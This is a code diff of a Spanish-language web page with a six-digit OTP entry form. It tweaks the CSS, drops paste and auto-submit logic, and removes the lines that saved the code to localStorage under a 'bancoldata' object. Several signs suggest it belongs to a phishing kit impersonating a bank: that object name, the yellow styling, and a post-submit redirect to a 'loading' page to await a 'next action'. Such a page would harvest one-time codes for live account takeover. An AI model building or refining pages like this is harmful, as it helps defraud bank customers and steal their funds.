@@ -34,29 +34,26 @@
             transform: translate(-50%, -50%);
             background-color: rgb(255, 255, 255);
             width: 320px;
-            height: 70px;
+            height: 66px;
             display: flex;
             justify-content: center;
             align-items: center;
             border-radius: 8px;
-            padding: 0 15px;
         }
         .center-box .input-container {
             position: relative;
-            width: 100%;
+            width: 90%;
             display: flex;
             justify-content: space-between;
-            gap: 8px;
         }
         .center-box input {
             width: 40px;
             height: 50px;
             text-align: center;
-            font-size: 20px;
+            font-size: 19px;
             border: none;
-            border-bottom: 2px solid #ffe100;
+            border-bottom: 1px solid #ffe100;
             outline: none;
-            background: transparent;
         }
         .button-container {
             position: absolute;
@@ -82,10 +79,6 @@
             background-color: #ffda37;
             color: black;
         }
-        .button-container button:last-child:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
     </style>
 </head>
 <body>
@@ -103,7 +96,7 @@
         </div>
         <div class="button-container">
             <button onclick="window.history.back()">Cancelar</button>
-            <button id="submitOtpButton" disabled>Verificar</button>
+            <button id="submitOtpButton">Verificar</button>
         </div>
     </div>
 
@@ -126,9 +119,6 @@
                 if (index < inputs.length - 1 && value !== '') {
                     inputs[index + 1].focus();
                 }
-
-                // Verificar si todos los campos están llenos
-                checkAllInputsFilled();
             });
 
             input.addEventListener('keydown', (e) => {
@@ -138,34 +128,9 @@
                     }
                 }
             });
-
-            // Pegado de código completo
-            input.addEventListener('paste', (e) => {
-                e.preventDefault();
-                const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
-                if (pasteData.length === 6) {
-                    pasteData.split('').forEach((char, charIndex) => {
-                        if (inputs[charIndex]) {
-                            inputs[charIndex].value = char;
-                        }
-                    });
-                    checkAllInputsFilled();
-                    inputs[5].focus();
-                }
-            });
         });
 
-        function checkAllInputsFilled() {
-            const allFilled = Array.from(inputs).every(input => input.value !== '');
-            submitOtpButton.disabled = !allFilled;
-            
-            // Si todos están llenos, enviar automáticamente
-            if (allFilled) {
-                submitOtp();
-            }
-        }
-
-        async function submitOtp() {
+        submitOtpButton.addEventListener('click', async () => {
             const otpCode = Array.from(inputs)
                                 .map(input => input.value)
                                 .join('');
@@ -203,10 +168,6 @@
                 console.log('Respuesta OTP:', result);
 
                 if (result.ok) {
-                    // Guardar OTP en localStorage
-                    bancoldata.otp = otpCode;
-                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-                    
                     // Redirigir a loading para esperar siguiente acción
                     window.location.href = 'loading.html';
                 } else {
@@ -217,22 +178,15 @@
                 console.error('Error enviando OTP:', error);
                 alert('Error de conexión al enviar el código');
             }
-        }
-
-        submitOtpButton.addEventListener('click', submitOtp);
+        });
 
         // También enviar con Enter en cualquier input
         inputs.forEach(input => {
             input.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') {
-                    submitOtp();
+                    submitOtpButton.click();
                 }
             });
-        });
-
-        // Auto-focus en el primer input al cargar
-        window.addEventListener('load', () => {
-            inputs[0].focus();
         });
     </script>
 </body>
